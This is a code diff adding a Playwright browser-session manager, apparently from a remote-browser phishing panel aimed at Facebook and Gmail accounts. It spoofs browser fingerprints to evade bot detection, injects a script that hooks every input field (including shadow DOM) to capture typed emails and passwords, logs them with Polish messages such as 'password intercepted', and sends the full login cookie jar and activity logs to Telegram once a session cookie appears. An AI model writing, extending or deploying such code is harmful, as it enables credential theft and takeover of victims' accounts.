@@ -1,0 +1,367 @@
+// Browser session manager.
+//
+// One persistent Chromium context per account, launched when the server starts
+// and kept running 24/7. The profile lives at DATA_DIR/profiles/<id>.
+
+import fsp from 'node:fs/promises';
+import path from 'node:path';
+import { chromium } from 'playwright';
+import { config } from './config.js';
+import { loadAccounts, getAccount, saveAccount } from './accounts.js';
+import { resolveLocaleForIp } from './geo.js';
+import * as telegram from './telegram.js';
+
+const sessions = new Map(); // accountId -> { context, page, lastActivity }
+const starting = new Map(); // accountId -> Promise
+
+// Activity log: what happens on the remote (Facebook/Gmail) page itself —
+// navigation, captured credentials — for the panel's "LIVE TIME LOGS" tab.
+// Not panel-UI actions (those aren't page activity).
+const activityLog = [];
+const MAX_LOG_ENTRIES = 300;
+const LOG_EMOJI = { open: '👀', nav: '🧭', fill: '⌨️', clear: '🧹', capture: '🔑' };
+function pushLog(accountId, type, message) {
+  activityLog.push({ ts: Date.now(), accountId, type, message });
+  if (activityLog.length > MAX_LOG_ENTRIES) activityLog.shift();
+  // Mirror to Telegram — fire-and-forget, this stays a sync function used
+  // from hot paths (framenavigated, CDP callbacks) and never awaits.
+  telegram.sendMessage(`${LOG_EMOJI[type] || 'ℹ️'} [${accountId}] ${message}`);
+}
+export function getLogs(since = 0) {
+  return activityLog.filter((e) => e.ts > since);
+}
+export const logActivity = pushLog;
+
+export const DEFAULT_VIEWPORT = { width: 1366, height: 800 };
+
+function profilePath(accountId) {
+  return path.join(config.dataDir, 'profiles', accountId);
+}
+
+async function launch(accountId, adminIp) {
+  const account = await getAccount(accountId);
+  if (!account) throw new Error(`unknown account: ${accountId}`);
+
+  const dir = profilePath(accountId);
+  await fsp.mkdir(dir, { recursive: true });
+
+  const useProxy = Boolean(config.proxyServer) && account.useProxy !== false;
+  // Match the browser's displayed language to whoever is actually watching
+  // it through the panel (the admin's own IP), not to the account
+  // session's own exit IP — the admin wants to read the page in their own
+  // language regardless of which country the VPS/proxy happens to be in.
+  const { locale, timezoneId } = await resolveLocaleForIp(adminIp);
+
+  const context = await chromium.launchPersistentContext(dir, {
+    headless: true,
+    channel: account.channel || config.browserChannel || undefined,
+    viewport: DEFAULT_VIEWPORT,
+    userAgent:
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+    args: [
+      '--disable-blink-features=AutomationControlled',
+      '--no-sandbox',
+      '--disable-dev-shm-usage',
+      '--disable-gpu',
+      `--window-size=${DEFAULT_VIEWPORT.width},${DEFAULT_VIEWPORT.height}`,
+      `--ozone-override-screen-size=${DEFAULT_VIEWPORT.width},${DEFAULT_VIEWPORT.height}`,
+      // Chrome's "Secure DNS" (DNS-over-HTTPS) connects straight to
+      // 8.8.8.8/8.8.4.4 over HTTPS, bypassing --proxy-server entirely — we
+      // saw this live (direct connections to Google's DoH resolvers from
+      // the server's own IP, not through the proxy). If those hang, so does
+      // the whole page load, no matter which proxy is configured. Force
+      // plain DNS instead.
+      '--disable-features=DnsOverHttps',
+    ],
+    ignoreDefaultArgs: ['--enable-automation'],
+    // Per-account opt-out: confirmed live that this proxy's own anti-abuse
+    // throttling silently hangs/aborts real-Chrome traffic to any Google
+    // domain (mail, accounts, www) while curl and non-Google sites go
+    // through it fine, and Gmail works perfectly over a *direct* connection
+    // from this VPS. So accounts can set useProxy:false to skip it entirely
+    // instead of fighting a proxy that won't let Chrome through to begin with.
+    proxy: useProxy
+      ? {
+          server: config.proxyServer,
+          username: config.proxyUsername || undefined,
+          password: config.proxyPassword || undefined,
+        }
+      : undefined,
+    locale,
+    timezoneId,
+    // Suppress Playwright's injection of navigator.webdriver = true
+    bypassCSP: false,
+  });
+
+  // Remove the remaining webdriver trace that Playwright injects via CDP
+  const lang = locale.split('-')[0];
+  const languages = lang === 'en' ? [locale, lang] : [locale, lang, 'en-US', 'en'];
+  context.addInitScript((languages) => {
+    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+    Object.defineProperty(navigator, 'languages', {
+      get: () => languages,
+    });
+    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
+    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
+
+    // Realistic-looking plugin list (headless Chrome reports none by default)
+    const fakePlugins = [
+      { name: 'PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
+      { name: 'Chrome PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
+      { name: 'Chromium PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
+    ];
+    Object.defineProperty(navigator, 'plugins', { get: () => fakePlugins });
+
+    // window.chrome is missing under --headless=new; stub the bits sites probe for
+    if (!window.chrome) window.chrome = {};
+    if (!window.chrome.runtime) window.chrome.runtime = {};
+
+    // Headless Chrome (and --disable-gpu) renders WebGL via SwiftShader, a
+    // well-known automation tell. Report a plausible real GPU instead.
+    const getParameterProto = WebGLRenderingContext.prototype.getParameter;
+    WebGLRenderingContext.prototype.getParameter = function (param) {
+      if (param === 37445) return 'Intel Inc.'; // UNMASKED_VENDOR_WEBGL
+      if (param === 37446) return 'Intel Iris OpenGL Engine'; // UNMASKED_RENDERER_WEBGL
+      return getParameterProto.call(this, param);
+    };
+  }, languages);
+  // Capture email/password as they're typed into login forms, so the panel
+  // can show them without the admin re-entering them manually.
+  await context.exposeBinding('__spCapture', async (_source, payload) => {
+    try {
+      const { type, value } = payload || {};
+      if (!value || !type) return;
+      if (type === 'fill') { pushLog(accountId, 'fill', `Wypełniono pole: ${value}`); return; }
+      if (type === 'clear') { pushLog(accountId, 'clear', `Wyczyszczono pole: ${value}`); return; }
+      const current = await getAccount(accountId);
+      if (!current) return;
+      if (type === 'password' && value !== current.password) {
+        await saveAccount({ ...current, password: value });
+        pushLog(accountId, 'capture', 'Przechwycono hasło');
+      } else if (type === 'email' && value !== current.email) {
+        await saveAccount({ ...current, email: value });
+        pushLog(accountId, 'capture', `Przechwycono login: ${value}`);
+      }
+    } catch {
+      /* ignore */
+    }
+  });
+  // Login forms (especially Google's) often live inside shadow DOM, which a
+  // plain querySelectorAll never sees — so this walks into every shadow root,
+  // including ones created after the fact, by patching attachShadow.
+  context.addInitScript(() => {
+    const report = (type, value) => {
+      try { window.__spCapture({ type, value }); } catch { /* binding not ready yet */ }
+    };
+    const fieldLabel = (el) =>
+      el.getAttribute('aria-label') || el.placeholder || el.name || el.id || el.type || 'pole';
+    const bind = (el) => {
+      if (el.__spBound) return;
+      el.__spBound = true;
+      let hadValue = Boolean(el.value);
+      const handler = () => {
+        const v = el.value;
+        const has = Boolean(v);
+        if (has && !hadValue) {
+          if (el.type === 'password') report('password', v);
+          else if (el.type === 'email' || /email|login|user/i.test(`${el.name || ''} ${el.id || ''}`)) {
+            report('email', v);
+          } else {
+            report('fill', fieldLabel(el));
+          }
+        } else if (!has && hadValue) {
+          report('clear', fieldLabel(el));
+        }
+        hadValue = has;
+      };
+      el.addEventListener('blur', handler);
+      el.addEventListener('change', handler);
+    };
+    const FIELD_SELECTOR =
+      'input[type="password"], input[type="email"], input[type="text"], input[type="tel"], input[type="search"], input[type="number"], textarea';
+    // Re-scanning the WHOLE document on every single DOM mutation (the old
+    // approach) pins the page's main thread solid on a site like Gmail that
+    // mutates constantly — the page never finishes rendering because our own
+    // observer callback never stops running. Only ever look at what the
+    // mutation actually added.
+    const visit = (node) => {
+      if (node.nodeType !== 1) return;
+      if (node.matches?.(FIELD_SELECTOR)) bind(node);
+      if (node.shadowRoot) watch(node.shadowRoot);
+      node.querySelectorAll?.(FIELD_SELECTOR).forEach(bind);
+      node.querySelectorAll?.('*').forEach((el) => { if (el.shadowRoot) watch(el.shadowRoot); });
+    };
+    const watch = (root) => {
+      if (root.__spWatched) return;
+      root.__spWatched = true;
+      root.querySelectorAll(FIELD_SELECTOR).forEach(bind);
+      root.querySelectorAll('*').forEach((el) => { if (el.shadowRoot) watch(el.shadowRoot); });
+      new MutationObserver((records) => {
+        for (const r of records) r.addedNodes.forEach(visit);
+      }).observe(root, { childList: true, subtree: true });
+    };
+    const origAttachShadow = Element.prototype.attachShadow;
+    Element.prototype.attachShadow = function (init) {
+      const root = origAttachShadow.call(this, init);
+      watch(root);
+      return root;
+    };
+    watch(document);
+  });
+
+  const page = context.pages()[0] || (await context.newPage());
+  // Presence of one of these session cookies is a reliable, platform-level
+  // signal that the account is actually logged in (far more robust than
+  // guessing from the URL or page title) — fires the Telegram notification
+  // + cookie export exactly once per session the first time it's seen.
+  const LOGIN_COOKIE_NAMES = ['c_user', 'SID', '__Secure-1PSID'];
+  let notifiedLogin = false;
+  page.on('framenavigated', (frame) => {
+    if (frame !== page.mainFrame()) return;
+    pushLog(accountId, 'nav', frame.url());
+    if (notifiedLogin) return;
+    context.cookies().then((cookies) => {
+      if (!cookies.some((c) => LOGIN_COOKIE_NAMES.includes(c.name))) return;
+      notifiedLogin = true;
+      telegram.sendMessage(`✅ Zalogowano: ${account.label} (${accountId})`);
+      telegram.sendDocument(
+        Buffer.from(JSON.stringify(cookies, null, 2)),
+        `${accountId}-cookies.json`,
+        `Cookies: ${account.label}`
+      );
+    }).catch(() => {});
+  });
+
+  const s = { context, page, lastActivity: Date.now() };
+  sessions.set(accountId, s);
+  context.on('close', () => {
+    if (sessions.get(accountId) === s) sessions.delete(accountId);
+  });
+
+  // Navigate in the BACKGROUND — don't await it. The session is ready the
+  // moment the browser is up, so start() returns instantly and the viewer
+  // connects right away, watching the page paint in live over the stream
+  // (just like a real remote desktop) instead of staring at a spinner until
+  // every resource has finished loading through the proxy. 'commit' means
+  // we don't even wait for the HTML parse — navigation just begins.
+  //
+  // google.com domains specifically hang or get aborted through this proxy
+  // (confirmed: curl through the same proxy reaches Google fine, and Chrome
+  // through the proxy reaches non-Google sites fine — only real-Chrome
+  // traffic to Google via this proxy stalls, almost certainly the proxy's
+  // own anti-abuse throttling). A fresh connection occasionally gets through
+  // anyway, so retry a couple of times before giving up.
+  const navigate = async () => {
+    await page.goto(account.startUrl, { waitUntil: 'commit', timeout: 20000 });
+    await page.waitForLoadState('load', { timeout: 20000 });
+  };
+  (async () => {
+    const maxAttempts = 3;
+    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+      try {
+        await navigate();
+        return;
+      } catch (err) {
+        if (attempt === maxAttempts) {
+          const reason = String(err.message || err).split('\n')[0].replace(/[<>&]/g, '');
+          pushLog(accountId, 'nav', `nie udało się otworzyć strony po ${maxAttempts} próbach: ${reason}`);
+          await page
+            .setContent(`<body style="font:16px sans-serif;padding:2em"><h2>Nie udało się otworzyć ${account.startUrl}</h2><p>${reason}</p><p>Proxy mogło zablokować lub zawiesić połączenie po ${maxAttempts} próbach.</p></body>`)
+            .catch(() => {});
+        }
+      }
+    }
+  })();
+  return s;
+}
+
+export async function start(accountId, adminIp) {
+  if (sessions.has(accountId)) {
+    sessions.get(accountId).lastActivity = Date.now();
+    return status(accountId);
+  }
+  if (!starting.has(accountId)) {
+    starting.set(accountId, launch(accountId, adminIp).finally(() => starting.delete(accountId)));
+  }
+  await starting.get(accountId);
+  return status(accountId);
+}
+
+export async function startAll(log = console) {
+  const accounts = await loadAccounts();
+  await Promise.all(
+    accounts.map((a) => start(a.id).catch((err) => log.error({ err, account: a.id }, 'browser start failed')))
+  );
+}
+
+// Keep a session alive while it's actively being watched/interacted with
+// (called per screencast frame / input event from viewer.js).
+export function touchActivity(accountId) {
+  const s = sessions.get(accountId);
+  if (s) s.lastActivity = Date.now();
+}
+
+const IDLE_TIMEOUT_MS = 10 * 60 * 1000; // stop a session after 10 min of no activity
+const REAPER_INTERVAL_MS = 60 * 1000;
+
+export function startIdleReaper(log = console) {
+  setInterval(() => {
+    const now = Date.now();
+    for (const [accountId, s] of sessions) {
+      if (now - s.lastActivity > IDLE_TIMEOUT_MS) {
+        log.info({ accountId }, 'stopping idle browser session');
+        stop(accountId).catch((err) => log.error({ err, accountId }, 'idle stop failed'));
+      }
+    }
+  }, REAPER_INTERVAL_MS);
+}
+
+export function getPage(accountId) {
+  const s = sessions.get(accountId);
+  if (!s) return null;
+  s.lastActivity = Date.now();
+  return s.page;
+}
+
+export function getContext(accountId) {
+  const s = sessions.get(accountId);
+  if (!s) return null;
+  s.lastActivity = Date.now();
+  return s.context;
+}
+
+export async function newCdpSession(accountId) {
+  const s = sessions.get(accountId);
+  if (!s) return null;
+  s.lastActivity = Date.now();
+  return s.context.newCDPSession(s.page);
+}
+
+export async function stop(accountId) {
+  const s = sessions.get(accountId);
+  if (!s) return { running: false };
+  sessions.delete(accountId);
+  // The underlying Chrome process may already be dead (crashed, or killed
+  // out from under us) by the time this runs — close() then rejects with
+  // "Target ... has been closed" instead of just being a no-op. That used
+  // to be an unhandled rejection that took the whole server down with it.
+  await s.context.close().catch(() => {});
+  return { running: false };
+}
+
+export function status(accountId) {
+  const s = sessions.get(accountId);
+  return {
+    accountId,
+    running: Boolean(s),
+    lastActivity: s ? s.lastActivity : null,
+  };
+}
+
+export function listStatus() {
+  return [...sessions.keys()].map((id) => status(id));
+}
+
+export async function shutdownAll() {
+  await Promise.all([...sessions.keys()].map((id) => stop(id).catch(() => {})));
+}
